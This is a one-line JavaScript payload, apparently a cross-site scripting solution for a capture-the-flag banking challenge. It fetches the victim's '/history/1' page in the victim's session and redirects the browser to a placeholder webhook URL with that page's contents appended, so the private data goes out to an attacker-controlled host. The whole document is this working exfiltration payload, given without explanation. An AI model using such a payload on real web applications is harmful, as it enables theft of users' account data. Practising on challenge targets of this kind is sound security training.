fetch('http://virtualbank.challs.olicyber.it/history/1').then(r => r.text()).then(t => {window.location='your-webhook' + encodeURIComponent(t)});
